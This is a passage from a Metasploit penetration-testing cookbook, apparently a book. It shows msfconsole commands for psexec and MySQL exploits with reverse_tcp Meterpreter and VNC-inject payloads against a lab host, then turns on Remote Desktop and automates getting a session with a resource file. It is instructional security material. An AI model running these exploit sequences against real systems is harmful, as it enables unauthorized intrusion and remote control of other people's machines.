
## How to do it...

We will use the Microsoft Windows Authenticated User Code Execution exploit module with the windows/vncinject/reverse_tcp payload for injecting the VNC server remotely:

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf exploit(psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf exploit(psexec) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(psexec) > set PAYLOAD windows/vncinject/reverse_tcp
PAYLOAD => windows/vncinject/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(psexec) > exploit
...
[-] 192.168.216.10:445 - Exploit aborted due to failure: unknown: 192.168.216.10:445 - Unable to execute specified command: The SMB server did not reply to our request
[*] Exploit completed, but no session was created.
msf exploit(psexec) >
```

Now, you should see a remote VNC session from the injected VNC DLL:

![](img/6b6e557533100c0e47951d0e5e14c4ee_540_0.png)

## Enabling Remote Desktop

Some organizations may not allow VNC, and by using it in our payload, we could trigger some alarms. This is one of the reasons why we should try to use the OS built-in tools, such as Remote Desktop.

## How to do it...

- 1. First, to do this recipe, we need to disable Remote Desktop on the target machine, Metasploitable 3, since it is enabled by default:

![](img/6b6e557533100c0e47951d0e5e14c4ee_541_0.png)

- 2. Then, to enable Remote Desktop, we first need to have a Meterpreter session on the target machine. For this recipe, we can use the Oracle MySQL for Microsoft Windows Payload Execution, which takes advantage of the absence of common MySQL passwords:

```
msf > use windows/mysql/mysql_payload
msf exploit(mysql_payload) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(mysql_payload) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(mysql_payload) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(mysql_payload) > exploit
```

```
...
[*] Sending stage (205379 bytes) to 192.168.216.10
[*] 192.168.216.10:3306 - Command Stager progress
- 100.00% done (12022/12022 bytes)
[*] Meterpreter session 1 opened
(192.168.216.5:4444 -> 192.168.216.10:49778)
at 2017-11-23 16:44:00 -0500

meterpreter >
```

- 3. Now that we have a running session, we can enable Remote Desktop using the run getgui Meterpreter script with the -e option. This will enable Remote Desktop and won't create a new user:

```
meterpreter > run getgui -e

[!] Meterpreter scripts are deprecated. Try
post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp
OPTION=value [...] 
[*] Windows Remote Desktop Configuration Meterpreter
Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] The Terminal Services service is not set to auto,
changing it to auto ...
```

```
[*] Opening port in local firewall if necessary
[*] For cleanup use command:
run multi_console_command -r /root/.msf4/logs
/scripts/getgui/clean_up__20171123.4632.rc
meterpreter >
```

- 4. To connect via Remote Desktop, we can use the rdesktop command with the -u option to specify the username we want to connect with:

```
rdesktop 192.168.216.10 -u Administrator
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_543_0.png)

## How it works...

If you looked carefully at the output of the Meterpreter script command, you may have noticed the warning stating that Meterpreter scripts are deprecated and that we should use the post-exploitation module post/windows/manage/enable_rdp instead.

So, let's use the post-exploitation module and see how it works:

- 1. In the Meterpreter session, we will use the background command to background the session and go back to the Metasploit console:

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(mysql_payload) >
```

- 2. Then, we will use the use command to load the post/windows/manage/enable_rdp post-exploitation module and take a look at the options:

```
msf exploit(mysql_payload) > use post/windows/manage
/enable_rdp
msf post(enable_rdp) > show options

Module options (post/windows/manage/enable_rdp):
```

| Name | Current Setting | Required | Description |
|------|-----------------|----------|-------------|
| ENABLE | true | no | Enable the RDP Service and Firewall Exception. |
| FORWARD | false | no | Forward remote port 3389 to local Port. |
| LPORT | 3389 | no | Local port to forward remote connection. |
| PASSWORD |  | no | Password for the user created. |
| SESSION |  | yes | The session to run this module on. |
| USERNAME |  | no | The username of the user to create. |

```
msf post(enable_rdp) >
```

- 3. To enable Remote Desktop, we just need to set the SESSION to run the module on and type run:

```
msf post(enable_rdp) > set SESSION 1
SESSION => 1
msf post(enable_rdp) > run

[*] Enabling Remote Desktop
[*] RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] Terminal Services service is already set to auto
[*] Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file:
/root/.msf4/loot/20171123170402_default
_192.168.216.10_host.windows.cle_349771.txt
[*] Post module execution completed
msf post(enable_rdp) >
```

Great! The module completed successfully; now, we can use the rdesktop command to access the target.

## 14 Post-Exploitation

In this chapter, we will cover the following recipes:

- Post-exploitation modules
- Privilege escalation and process migration
- Bypassing UAC
- Dumping the contents of the SAM database
- Passing the hash
- Incognito attacks with Meterpreter
- Using Mimikatz
- Setting up a persistence with backdoors
- Becoming TrustedInstaller
- Backdooring Windows binaries
- Pivoting with Meterpreter
- Port forwarding with Meterpreter
- Credential harvesting
- Enumeration modules
- Autoroute and socks proxy server
- Analyzing an existing post-exploitation module
- Writing a post-exploitation module

## Introduction

With more than three hundred post-exploitation modules, Metasploit is one of the best frameworks for penetration testing, covering every phase from information gathering to post-exploitation, and even reporting in the pro version.

Now that you have learned how to exploit remote targets, this chapter will focus on privilege escalation, persistence, grabbing credentials, and lateral movement.

## Post-exploitation modules

After the evolution of the Metasploit Framework, Meterpreter scripts, which serve the purpose of automating post-exploitation tasks, were deprecated and replaced by post-exploitation modules, which provided a more stable and flexible way to automate post-exploitation tasks.

## Getting ready

Because we will be focusing on post-exploitation, every recipe in this chapter will start within a remote Meterpreter session.

To ease the task of getting a remote session, you can use the make rc command within the msfconsole to create a resource file that will automate the exploitation of the target machine.

Take, for example, the following resource file:

```
root@kali:~# cat psexec.rc
use exploit/windows/smb/psexec
set RHOST 192.168.216.10
set SMBUSER Administrator
set SMBPASS vagrant
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.216.5
exploit
```

By starting the msfconsole with the -r option followed by the path of the resource file, we can get a remote session without any effort:

```
root@kali:~# msfconsole -qr psexec.rc
...
[*] Sending stage (205379 bytes) to 192.168.216.10
[*] Meterpreter session 1 opened (192.168.216.5:4444 -> 192.168.216.10:49327) at 2017-11-25 05:38:46 -0500

meterpreter >
```

## How to do it...

- 1. To start using post-exploitation modules, first we need to get a session on the target system. For that, you can use a resource file or manually exploit a vulnerability to get a Meterpreter session. Then, we will use the `background` command to go back to the `msfconsole`, where we can start exploring the available post-exploitation modules:

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(psexec) >
```

- 2. Looking at the Metasploit structure, we can see that there are post-exploitation modules available for different target systems:

```
root@kali:~# ls /usr/share/metasploit-framework/modules/post
aix android cisco firefox hardware linux multi osx
solaris windows
```

- 3. These exploitation modules are categorized by the tasks performed:

```
root@kali:~# ls /usr/share/metasploit-framework/modules/post/windows/
capture escalate gather manage recon wlan
```

- 4. Within msfconsole, to list all the available post-exploitation modules, we can type the `use` command followed by the word `post`, then hit the Tab key twice and type y to display all the possibilities:

![](img/6b6e557533100c0e47951d0e5e14c4ee_548_0.png)
